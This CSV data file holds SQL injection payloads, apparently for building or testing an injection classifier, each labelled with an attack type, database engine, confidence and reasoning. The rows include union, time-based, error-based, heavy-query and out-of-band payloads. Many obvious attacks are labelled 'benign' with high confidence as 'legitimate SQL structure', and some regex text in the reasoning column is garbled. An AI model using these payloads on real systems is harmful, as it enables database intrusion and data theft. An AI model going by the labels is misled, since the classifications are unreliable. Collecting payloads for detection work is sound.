id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25544,-3867%' ) or 3084 = 5633 and ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25545,"create or replace function sleep ( int ) returns int as '/lib/libc.so.6','sleep' language 'c' strict",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25546,-7565%' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25547,select ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25548,-2456' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'bbkp' = 'bbkp,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25549,"1%"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25550,"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""text"" like ""text",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25551,"-2364'+ ( select 'qdut' where 7560 = 7560 union all select 7560,7560,7560,7560,7560--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25552,"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'uadr' like 'uadr",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25553,"1%' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25554,-1354 ) ) or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25555,"1' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25556,"-7743"" or 9323 = 9323#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25557,"-9928"" ) ) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25558,"1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25559,1'|| ( select 'ghby' from dual where 4854 = 4854,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25560,-4032' ) where 5157 = 5157 or 1809 = 2810#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25561,"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""abcm"" like ""abcm",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25562,1' ) or sleep ( 5 ) and ( 'kgbm' = 'kgbm,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25563,"1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25564,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) -- xsob",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25565,1 ) where 2307 = 2307,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25566,"1"" ) as ifgl where 2190 = 2190 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25567,-8999' ) ) ) or 6872 = 6872 and ( ( ( 'jare' = 'jare,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25568,"-1254"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25569,"1' in boolean mode ) and elt ( 9630 = 4765,4765 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25570,"1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25571,"1' ) union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25572,"1' in boolean mode ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25573,"-1988 where 4597 = 4597 union all select 4597,4597,4597,4597,4597,4597--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25574,"-4923"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""afjc"" like ""afjc",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25575,"1' ) and make_set ( 6488 = 5525,5525 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25576,1' in boolean mode ) union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25577,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""rugr"" = ""rugr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25578,1' ) where 8086 = 8086 and 1430 = 7941--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25579,"1"" ) as xaye where 5343 = 5343 and 4355 = 7475#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25580,"1"" ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25581,"1'|| ( select 'bccx' where 5881 = 5881 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25582,"-8487' ) where 9655 = 9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25583,-4389' ) ) ) or ( 1139 = 3499 ) *3499 and ( ( ( 'qoch' = 'qoch,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25584,"-4033' ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'ouup' = 'ouup",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25585,1' where 6406 = 6406,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25586,"1' ) where 5799 = 5799 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25587,"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""zlwb"" = ""zlwb",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25588,"1"" ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""djrh"" = ""djrh",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25589,-2129' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'eutm' like 'eutm,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
